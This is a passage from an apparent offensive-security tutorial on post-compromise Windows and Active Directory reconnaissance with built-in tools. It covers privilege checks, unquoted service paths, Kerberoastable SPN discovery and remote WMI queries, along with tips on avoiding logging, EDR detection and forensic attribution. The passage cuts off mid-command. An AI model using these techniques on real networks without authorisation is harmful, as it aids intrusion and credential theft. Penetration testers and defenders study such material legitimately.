that half their automation scripts and management tools depend on it. These utilities are so deeply integrated into Windows administration that blocking them entirely isn't feasible for most organizations. The security team's hands are tied by operational requirements.\u003c/p\u003e\n\u003cp\u003eWhen you do get caught and someone analyzes what you did, there are no custom tools for forensic investigators to reverse engineer. They can't extract your C2 protocols, learn about your infrastructure, or discover indicators that might help them find your other operations. You used the same tools their own IT staff uses, just in creative ways, which means the forensic trail leads nowhere useful for attribution or infrastructure discovery.\u003c/p\u003e\n\u003cp\u003eThe downside - and there's always a downside - is that this approach requires significantly more skill and understanding than just running off-the-shelf tools. You need to really understand Windows internals, know how different utilities work, and be able to chain them together to accomplish your objectives. You need to understand what logs your actions create and how to avoid patterns that might trigger behavioral detections. It's more challenging, but the payoff in terms of operational security is massive.\u003c/p\u003e\n\u003ch2\u003eInitial Reconnaissance and Enumeration\u003c/h2\u003e\n\u003cp\u003eLet me walk you through how I typically start reconnaissance after getting that initial shell. The first few minutes are critical - you need to understand where you are, what you have access to, and what the environment looks like, all while keeping a low profile.\u003c/p\u003e\n\u003ch3\u003eUnderstanding Your Initial Foothold\u003c/h3\u003e\n\u003cp\u003eThe first thing I do is get oriented. I need to know what kind of system I'm on, what privileges I have, and whether this is a domain-joined machine. This tells me what my next steps should be and what techniques are available to me.\u003c/p\u003e\n\u003cp\u003eI start with PowerShell because it's the most versatile tool for enumeration and it's available on every modern Windows system. Here's the thing about PowerShell though - it's powerful, but it's also heavily logged in modern environments. Every command you run can potentially show up in logs that security teams monitor. So while I'm going to show you comprehensive enumeration techniques, in a real engagement you'd want to be more selective about what you query.\u003c/p\u003e\n\u003cp\u003eLet's start with basic system information:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Check what OS we're running\nGet-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis tells me if I'm on a workstation or server, what version of Windows, and whether it's 32 or 64-bit. The version is particularly important because older systems might have different tools available and different security features. For example, Windows 7 and Server 2008 have PowerShell 2.0 by default, which doesn't have the same logging capabilities as modern versions. Knowing this helps me understand what I can get away with.\u003c/p\u003e\n\u003cp\u003eNext, I check if the system is domain-joined:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# See if we're in a domain\n(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain\n\n# If yes, get the domain name\n(Get-WmiObject -Class Win32_ComputerSystem).Domain\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is huge. If the system is domain-joined, I'm not just on an isolated workstation - I potentially have access to an entire Active Directory environment. This changes everything about my approach. Instead of focusing on local privilege escalation, I can start thinking about lateral movement and domain-level attacks.\u003c/p\u003e\n\u003cp\u003eNow I need to understand what privileges I'm running with:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003ewhoami /all\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis single command gives me a wealth of information. It shows my username, what groups I'm in, and critically, what privileges my token has. If I see \"SeDebugPrivilege\" or \"SeImpersonatePrivilege,\" that's very interesting - these privileges can often be abused for privilege escalation. If I'm already in the local administrators group, my job just got a lot easier.\u003c/p\u003e\n\u003cp\u003eLet me show you what a typical output looks like and why it matters. When I run \u003ccode\u003ewhoami /all\u003c/code\u003e as a standard user, I might see something like:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eUSER INFORMATION\n----------------\nUser Name           SID\n=================== ========\nCORP\\jsmith         S-1-5-21-...\n\nGROUP INFORMATION\n-----------------\nGroup Name                             Type\n====================================== ====\nEveryone                               Well-known group\nBUILTIN\\Users                          Alias\nNT AUTHORITY\\INTERACTIVE               Well-known group\nNT AUTHORITY\\Authenticated Users       Well-known group\n\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis tells me I'm a domain user (CORP\\jsmith), I'm in the standard Users group, and I have very limited privileges. This is the typical starting point. But if I see something like this:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eGROUP INFORMATION\n-----------------\nBUILTIN\\Administrators                 Alias\n\nPRIVILEGES INFORMATION\n----------------------\nSeDebugPrivilege                  Debug programs                       Enabled\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow we're talking. If I'm in the Administrators group, I can do pretty much anything on this local system. And if I have SeDebugPrivilege enabled, I can attach to and read memory from any process - including LSASS, which contains credentials.\u003c/p\u003e\n\u003ch3\u003eEnumerating Local Users and Groups\u003c/h3\u003e\n\u003cp\u003eUnderstanding who uses this system and what their privileges are helps me plan my next moves. Maybe there's a local admin account I can target, or maybe I can figure out who to impersonate for social engineering.\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all local users\nGet-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhat I'm looking for here are admin accounts, enabled accounts that haven't been used recently (potential abandoned accounts), and accounts with old passwords (potentially weak or default passwords). In one engagement, I found a local \"Support\" account that had been created three years ago and never disabled. The password was \u003ccode\u003eSupport123\u003c/code\u003e - and it was in the local administrators group.\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# See who's in the local administrators group\nGet-LocalGroupMember -Group \"Administrators\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is critical. If there are domain accounts in the local administrators group, those accounts can be used to access this system from anywhere on the network. This is also where I often find evidence of privileged users - maybe the desktop support team has their domain accounts in local admin, or maybe the system owner has elevated rights.\u003c/p\u003e\n\u003ch3\u003eUnderstanding Running Processes and Services\u003c/h3\u003e\n\u003cp\u003eKnowing what's running on the system tells me a lot about what I'm dealing with. Is there endpoint security? Is this a developer workstation? Is there interesting software I can abuse?\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get all running processes with their paths\nGet-Process | Select-Object ProcessName, Id, Path | Sort-Object ProcessName\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen I look through this output, I'm specifically looking for security products (CrowdStrike, Carbon Black, SentinelOne, etc.), development tools (Visual Studio, database tools), and interesting applications that might store credentials or data. I'm also looking for processes running with high privileges that might be exploitable.\u003c/p\u003e\n\u003cp\u003eFor services, I want to see what's configured to run, especially what's running as SYSTEM:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Find services running as SYSTEM\nGet-WmiObject win32_service | Where-Object {$_.StartName -eq \"LocalSystem\"} | Select-Object Name, PathName, State, StartMode\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHere's why this matters: if I can find a service running as SYSTEM that I can manipulate - maybe it has weak permissions on its executable, or maybe it has an unquoted service path - I can potentially escalate privileges. Let me show you what an unquoted service path vulnerability looks like:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Look for unquoted service paths with spaces\nGet-WmiObject win32_service | Where-Object {\n    $_.PathName -notlike '\"*' -and\n    $_.PathName -like '* *'\n} | Select-Object Name, PathName, StartName, State\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf this returns something like:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eName     : VulnerableService\nPathName : C:\\Program Files\\Company App\\Service.exe\nStartName: LocalSystem\nState    : Running\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is potentially exploitable. Because the path contains spaces and isn't quoted, Windows will actually try to execute \u003ccode\u003eC:\\Program.exe\u003c/code\u003e first, then \u003ccode\u003eC:\\Program Files\\Company.exe\u003c/code\u003e, before finally executing the correct file. If I have write access to \u003ccode\u003eC:\\\u003c/code\u003e, I can place a malicious \u003ccode\u003eProgram.exe\u003c/code\u003e and get code execution as SYSTEM when the service restarts.\u003c/p\u003e\n\u003ch3\u003eNetwork Reconnaissance\u003c/h3\u003e\n\u003cp\u003eUnderstanding the network environment is crucial for planning lateral movement. I need to know what other systems are out there, what services are running, and how everything is connected.\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get basic network configuration\nGet-NetIPConfiguration\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis shows me the system's IP address, subnet, gateway, and DNS servers. The DNS servers are particularly interesting in a domain environment - they're often domain controllers, which are high-value targets.\u003c/p\u003e\n\u003cp\u003eTo see what connections this system has been making:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Show established network connections\nGet-NetTCPConnection | Where-Object {$_.State -eq \"Established\"} |\n    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |\n    Sort-Object RemoteAddress\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis tells me what the user has been connecting to. Maybe I see connections to file servers, database servers, or administrative systems. Each of these represents a potential target for lateral movement. I can also correlate the OwningProcess ID with running processes to understand what applications are making these connections.\u003c/p\u003e\n\u003cp\u003eThe ARP cache is another goldmine of information:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Check ARP cache for recently communicated hosts\nGet-NetNeighbor | Where-Object {$_.State -ne \"Unreachable\" -and $_.State -ne \"Incomplete\"} |\n    Select-Object IPAddress, LinkLayerAddress, State\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis shows me every system on the local subnet that this machine has communicated with recently. These are systems that the user interacts with, which means they're good candidates for lateral movement because the connections will look legitimate.\u003c/p\u003e\n\u003cp\u003eFor a more active approach, I can do a ping sweep to find live hosts on the subnet:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Ping sweep a subnet (be careful - this is noisy)\n1..254 | ForEach-Object {\n    $ip = \"192.168.1.$_\"\n    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {\n        Write-Output \"$ip is alive\"\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow, here's the important caveat: ping sweeps are noisy. Every single ping can be logged, and network monitoring tools will definitely see this. In a real engagement, I'm more likely to be passive and rely on the ARP cache and existing connections unless I have a good reason to actively scan.\u003c/p\u003e\n\u003ch3\u003eInstalled Software Enumeration\u003c/h3\u003e\n\u003cp\u003eWhat software is installed tells me a lot about what kind of system this is and what might be vulnerable or exploitable:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List installed software from registry (64-bit)\nGet-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |\n    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |\n    Where-Object {$_.DisplayName -ne $null}\n\n# Also check 32-bit software on 64-bit systems\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |\n    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |\n    Where-Object {$_.DisplayName -ne $null}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen I look through this list, I'm looking for several things. First, is there development software installed? If I see Visual Studio, SQL Server Management Studio, or other development tools, this might be a developer's workstation, which often means elevated privileges and access to sensitive systems. Second, are there outdated applications with known vulnerabilities? Third, are there interesting applications that might store credentials - VPN clients, remote desktop managers, database tools?\u003c/p\u003e\n\u003cp\u003eI also want to know what security products are installed:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Check for security products\nGet-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct |\n    Select-Object displayName, pathToSignedProductExe, productState\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis tells me what antivirus or endpoint protection is running. Knowing this helps me understand what detection capabilities I'm up against and what techniques I need to avoid. For example, if I see Windows Defender only, I know I'm dealing with basic protection. If I see CrowdStrike or Carbon Black, I know I need to be much more careful.\u003c/p\u003e\n\u003ch3\u003eActive Directory Enumeration\u003c/h3\u003e\n\u003cp\u003eIf the system is domain-joined - and most corporate workstations are - I can start enumerating Active Directory without uploading any tools. This is where things get really interesting because I'm no longer just looking at one isolated system; I'm looking at the entire domain infrastructure.\u003c/p\u003e\n\u003cp\u003eThe first thing I want to know is basic domain information:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get current domain information\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis returns comprehensive information about the domain - its name, the forest it's part of, domain controllers, and various domain settings. The domain controller list is particularly valuable because these are high-value targets.\u003c/p\u003e\n\u003cp\u003eTo see all the domain controllers explicitly:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all domain controllers\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers |\n    Select-Object Name, IPAddress, OSVersion\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow here's where it gets interesting. If the system has the ActiveDirectory PowerShell module installed (which is common on admin workstations and servers), I have access to incredibly powerful enumeration capabilities:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Check if ActiveDirectory module is available\nGet-Module -ListAvailable -Name ActiveDirectory\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf it's available, I can enumerate users, groups, computers, and basically everything in Active Directory:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all users in the domain\nGet-ADUser -Filter * -Properties * |\n    Select-Object Name, SamAccountName, Enabled, LastLogonDate, PasswordLastSet,\n                  whenCreated, AdminCount\n\n# Find domain administrators\nGet-ADGroupMember -Identity \"Domain Admins\" -Recursive |\n    Select-Object Name, SamAccountName, objectClass\n\n# List all computers in the domain\nGet-ADComputer -Filter * -Properties * |\n    Select-Object Name, OperatingSystem, OperatingSystemVersion,\n                  LastLogonDate, IPv4Address\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe AdminCount property is particularly interesting - it's set on accounts that are or have been members of privileged groups. This is a quick way to find accounts that have or had elevated privileges.\u003c/p\u003e\n\u003cp\u003eBut what if the ActiveDirectory module isn't installed? That's actually the more common scenario on standard workstations. The good news is that I can still enumerate Active Directory using .NET classes that are built into Windows:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Query AD without the ActiveDirectory module using ADSI\n$searcher = [ADSISearcher]\"(objectClass=user)\"\n$searcher.PropertiesToLoad.AddRange(@(\"samaccountname\",\"displayname\",\"mail\"))\n$searcher.FindAll() | ForEach-Object {\n    [PSCustomObject]@{\n        Username = $_.Properties['samaccountname'][0]\n        DisplayName = $_.Properties['displayname'][0]\n        Email = $_.Properties['mail'][0]\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis uses ADSI (Active Directory Service Interfaces), which is a COM interface that's always available on domain-joined systems. It's a bit more verbose than using the ActiveDirectory module, but it works without installing anything.\u003c/p\u003e\n\u003cp\u003eLet me show you how to find specific high-value targets. Domain Admins are the obvious target, but I can query for them without the module:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Find Domain Admins using ADSI\n$searcher = [ADSISearcher]\"(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)\"\n$searcher.FindAll() | ForEach-Object {\n    $_.Properties['samaccountname']\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003e1.2.840.113556.1.4.1941\u003c/code\u003e is the LDAP_MATCHING_RULE_IN_CHAIN OID, which gives us recursive group membership. This is important because it finds users who are members of Domain Admins indirectly through nested groups.\u003c/p\u003e\n\u003cp\u003eI also want to find computers, especially servers and domain controllers:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Find all computers\n$searcher = [ADSISearcher]\"(objectClass=computer)\"\n$searcher.PropertiesToLoad.AddRange(@(\"name\",\"operatingsystem\",\"operatingsystemversion\"))\n$searcher.FindAll() | ForEach-Object {\n    [PSCustomObject]@{\n        Name = $_.Properties['name'][0]\n        OS = $_.Properties['operatingsystem'][0]\n        Version = $_.Properties['operatingsystemversion'][0]\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOne of my favorite enumeration queries is looking for user accounts with interesting properties:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Find users with passwords that never expire\n$searcher = [ADSISearcher]\"(\u0026#x26;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))\"\n$searcher.FindAll() | ForEach-Object {\n    $_.Properties['samaccountname']\n}\n\n# Find users with \"password not required\" set\n$searcher = [ADSISearcher]\"(\u0026#x26;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\"\n$searcher.FindAll() | ForEach-Object {\n    $_.Properties['samaccountname']\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese accounts often have weak passwords or are service accounts with interesting privileges. The userAccountControl attribute uses bitwise flags, and the LDAP_MATCHING_RULE_BIT_AND (1.2.840.113556.1.4.803) lets us query for specific flags.\u003c/p\u003e\n\u003cp\u003eOne more incredibly useful query - finding Service Principal Names (SPNs), which are potential Kerberoasting targets:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Find accounts with SPNs (Kerberoastable accounts)\n$searcher = [ADSISearcher]\"(\u0026#x26;(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))\"\n$searcher.PropertiesToLoad.AddRange(@(\"samaccountname\",\"serviceprincipalname\"))\n$searcher.FindAll() | ForEach-Object {\n    [PSCustomObject]@{\n        Username = $_.Properties['samaccountname'][0]\n        SPN = $_.Properties['serviceprincipalname'][0]\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese are user accounts with SPNs registered. When you request a service ticket for these accounts, you get back a ticket encrypted with the account's password hash. If the account has a weak password, you can crack this ticket offline and compromise the account.\u003c/p\u003e\n\u003ch3\u003eAlternative: Native Windows Tools for AD Enumeration\u003c/h3\u003e\n\u003cp\u003eWhile PowerShell and ADSI are powerful for Active Directory enumeration, there are situations where you might not want to use PowerShell - maybe it's heavily logged, restricted by policy, or you're trying to avoid PowerShell-specific detections. Fortunately, Windows includes several native command-line tools that can enumerate Active Directory without touching PowerShell.\u003c/p\u003e\n\u003cp\u003eThese tools have been part of Windows for years, they're used by system administrators regularly, and they're often overlooked by security monitoring. Let me show you the most useful ones.\u003c/p\u003e\n\u003ch4\u003enltest - Domain Trust and DC Enumeration\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eüö® EDR REALITY CHECK (2025):\u003c/strong\u003e While nltest has been flying under the radar historically, detection engineers are now creating specific use cases for nltest, dsquery, and setspn enumeration. Multiple nltest commands in succession, especially \u003ccode\u003e/domain_trusts\u003c/code\u003e and \u003ccode\u003e/dclist\u003c/code\u003e, are being flagged as reconnaissance activity. In mature SOCs, these commands may trigger alerts when used outside of normal IT administrative hours or from unexpected user accounts. Still quieter than PowerShell Active Directory modules, but no longer invisible.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNltest.exe is a native Windows tool designed for testing and managing domain trust relationships. It's incredibly useful for understanding domain structure:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get list of domain controllers\nnltest /dclist:domain.local\n\n# Show domain trusts\nnltest /domain_trusts\n\n# Show all trusts including forest trusts\nnltest /domain_trusts /all_trusts\n\n# Get domain controller info\nnltest /dsgetdc:domain.local\n\n# Show current domain and site\nnltest /dsgetsite\n\n# Query domain information\nnltest /dcname:domain.local\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe domain trust information is particularly valuable. It shows you all the domains that trust relationships exist with, which domains are in the same forest, and potential paths for lateral movement across domain boundaries. In complex Active Directory environments, trust relationships can be your path to escalating from a compromised domain to the forest root or other connected domains.\u003c/p\u003e\n\u003cp\u003eHere's what the output looks like when you run \u003ccode\u003enltest /domain_trusts\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eList of domain trusts:\n    0: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)\n    1: DEV dev.corp.local (NT 5) (Forest: 0) (Direct Outbound) (Direct Inbound) (Native)\n    2: PROD prod.corp.local (NT 5) (Forest: 0) (Direct Outbound) (Direct Inbound) (Native)\nThe command completed successfully\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis tells me there are three domains in the forest, and they all have bidirectional trust relationships. This means if I compromise an account in DEV, I might be able to access resources in CORP or PROD.\u003c/p\u003e\n\u003ch4\u003edsquery - Direct AD Queries\u003c/h4\u003e\n\u003cp\u003eDsquery is part of the Remote Server Administration Tools (RSAT), but it's often installed on admin workstations and servers. It allows direct LDAP queries against Active Directory:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all users in the domain\ndsquery user -limit 0\n\n# List all computers\ndsquery computer -limit 0\n\n# List all groups\ndsquery group -limit 0\n\n# List all domain controllers\ndsquery server\n\n# Find users in a specific OU\ndsquery user \"OU=IT,DC=corp,DC=local\"\n\n# Find disabled accounts\ndsquery user -disabled\n\n# Find inactive computers (not logged in for 4 weeks)\ndsquery computer -inactive 4\n\n# Custom LDAP query for users with SPNs (Kerberoasting targets)\ndsquery * -filter \"(\u0026#x26;(objectClass=user)(servicePrincipalName=*))\" -attr samAccountName servicePrincipalName\n\n# Find users with adminCount=1 (current or former privileged accounts)\ndsquery * -filter \"(\u0026#x26;(objectClass=user)(adminCount=1))\" -attr samAccountName whenCreated\n\n# Find all user accounts (not computer accounts)\ndsquery * -filter \"(\u0026#x26;(objectCategory=person)(objectClass=user))\" -limit 0 -attr samAccountName displayName\n\n# Find domain admins\ndsquery group -name \"Domain Admins\" | dsget group -members\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe power of dsquery is in the \u003ccode\u003e-filter\u003c/code\u003e parameter, which accepts standard LDAP filter syntax. This is the same syntax we used with ADSI in PowerShell, but now we're using a native command-line tool.\u003c/p\u003e\n\u003cp\u003eHere's a practical example - finding all accounts with passwords set to never expire:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Find accounts with password never expires flag\ndsquery * -filter \"(\u0026#x26;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))\" -attr samAccountName pwdLastSet\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou can pipe dsquery output to dsget for more detailed information:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get detailed user information\ndsquery user -limit 10 | dsget user -samid -email -desc -disabled\n\n# Get detailed computer information\ndsquery computer -limit 10 | dsget computer -name -desc -loc\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch4\u003esetspn - Service Principal Name Enumeration\u003c/h4\u003e\n\u003cp\u003eSetspn.exe is the native tool for managing Service Principal Names. While it's designed for administrators to register and query SPNs, we can abuse it for Kerberoasting reconnaissance:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all SPNs in the domain\nsetspn -Q */*\n\n# List SPNs for a specific service type\nsetspn -Q MSSQLSvc/*\n\n# List SPNs for a specific host\nsetspn -L hostname\n\n# Find duplicate SPNs (usually a misconfiguration)\nsetspn -X\n\n# Query for HTTP SPNs (web applications)\nsetspn -Q HTTP/*\n\n# Query for specific service accounts\nsetspn -Q */* | findstr /i \"svc\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003e-Q\u003c/code\u003e flag queries Active Directory for SPNs. The \u003ccode\u003e*/*\u003c/code\u003e wildcard means \"all service types on all hosts.\" This returns every registered SPN in the domain, which is exactly what you need to identify Kerberoasting targets.\u003c/p\u003e\n\u003cp\u003eHere's what makes setspn particularly useful: unlike PowerShell queries that might trigger script execution monitoring, setspn is a simple native binary doing exactly what it's designed to do. It's used by administrators constantly for troubleshooting Kerberos authentication issues.\u003c/p\u003e\n\u003cp\u003eA practical workflow for finding Kerberoastable targets:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Find all SPNs and filter for user accounts (not computer accounts)\nsetspn -Q */* \u003e spns.txt\n\n# Then manually review or use findstr to filter\ntype spns.txt | findstr /v /i \"CN=Computers\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch4\u003enet - Legacy but Effective\u003c/h4\u003e\n\u003cp\u003eThe ancient net commands still work and are rarely monitored because they're so common:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Enumerate domain users\nnet user /domain\n\n# Get details on specific user\nnet user username /domain\n\n# Enumerate domain groups\nnet group /domain\n\n# Find domain admins\nnet group \"Domain Admins\" /domain\n\n# Find enterprise admins\nnet group \"Enterprise Admins\" /domain\n\n# Find local admins on current machine\nnet localgroup administrators\n\n# View domain password policy\nnet accounts /domain\n\n# Find domain controllers\nnet group \"Domain Controllers\" /domain\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese commands are ancient - they've been part of Windows since the NT days - but they still work perfectly for basic enumeration. They're also completely invisible to PowerShell logging because they're not PowerShell.\u003c/p\u003e\n\u003ch4\u003eCombining Native Tools for Complete Enumeration\u003c/h4\u003e\n\u003cp\u003eHere's a practical example of using only native tools for complete domain reconnaissance:\u003c/p\u003e\n\u003cpre class=\"language-batch\"\u003e\u003ccode class=\"language-batch\"\u003e@echo off\necho === Domain Information ===\nnltest /domain_trusts\necho.\n\necho === Domain Controllers ===\nnltest /dclist:%USERDNSDOMAIN%\necho.\n\necho === Domain Users (first 20) ===\ndsquery user -limit 20\necho.\n\necho === Domain Admins ===\nnet group \"Domain Admins\" /domain\necho.\n\necho === Kerberoastable Accounts ===\nsetspn -Q */*\necho.\n\necho === Domain Password Policy ===\nnet accounts /domain\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSave this as a .bat file and run it - you get comprehensive domain intelligence using only native Windows tools. No PowerShell, no ADSI, just built-in utilities that have been part of Windows for decades.\u003c/p\u003e\n\u003cp\u003eThe key advantage of these native tools is that they generate different log signatures than PowerShell. If defenders are hunting specifically for PowerShell-based enumeration, these commands might slip under the radar. They also work on older systems where PowerShell might not be available or might be PowerShell 2.0 without modern logging capabilities.\u003c/p\u003e\n\u003ch3\u003eRemote System Enumeration with WMI\u003c/h3\u003e\n\u003cp\u003eOnce I understand the local system and the domain structure, I want to start looking at other systems on the network. WMI (Windows Management Instrumentation) is perfect for this because it's a legitimate management protocol that's enabled by default on Windows systems.\u003c/p\u003e\n\u003cp\u003eHere's the key thing about WMI: if I have valid credentials (either from my current user context or credentials I've harvested), I can query remote systems for information without uploading any tools or making obvious connections.\u003c/p\u003e\n\u003cp\u003eLet me show you how to query a remote system:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get operating system information from a remote system\nGet-WmiObject -Class Win32_OperatingSystem -ComputerName TARGET-PC |\n    Select-Object CSName, Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis tells me what OS the target is running, when it was last rebooted, and its architecture. If the query succeeds, I know I have permission to query that system via WMI, which often means I can do much more.\u003c/p\u003e\n\u003cp\u003eTo see what processes are running on the remote system:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List processes on remote system\nGet-WmiObject -Class Win32_Process -ComputerName TARGET-PC |\n    Select-Object ProcessName, ProcessId, CommandLine, CreationDate |\n    Sort-Object CreationDate -Descending\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe CommandLine property is particularly interesting because it shows how the process was launched, including any command-line arguments. This sometimes reveals credentials, file paths, or other useful information.\u003c/p\u003e\n\u003cp\u003eI can also check what software is installed on the remote system:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List installed software on remote system\nGet-WmiObject -Class Win32_Product -ComputerName TARGET-PC |\n    Select-Object Name, Version, Vendor, InstallDate\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNote: Be careful with Win32_Product as it can trigger Windows Installer service and cause applications to repair themselves. In a stealth engagement, I usually avoid this class and instead query the registry remotely.\u003c/p\u003e\n\u003cp\u003eTo see who's logged into a remote system:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get logged-in users on remote 